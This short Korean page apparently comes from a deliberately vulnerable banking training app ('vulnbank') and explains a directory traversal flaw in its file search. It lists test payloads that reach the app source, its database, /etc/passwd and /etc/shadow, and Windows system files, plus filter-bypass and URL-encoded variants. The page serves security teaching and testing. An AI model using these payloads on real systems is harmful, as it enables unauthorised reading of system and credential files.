파일 검색

📁 디렉토리 트래버설 취약점:

파일 경로에 ../를 사용하여 상위 디렉토리 접근이 가능합니다.

테스트 페이로드:

  • ../app.py - 애플리케이션 소스코드
  • ../vulnbank.db - 데이터베이스 파일
  • ../../etc/passwd - 시스템 사용자 목록 (Linux)
  • ../../etc/shadow - 비밀번호 해시 (Linux, root 권한 필요)
  • ....//....//etc/passwd - 필터 우회
  • ..%2f..%2f..%2fetc/passwd - URL 인코딩 우회

Windows의 경우:

  • ..\..\..\Windows\win.ini
  • ..\..\..\Windows\System32\drivers\etc\hosts
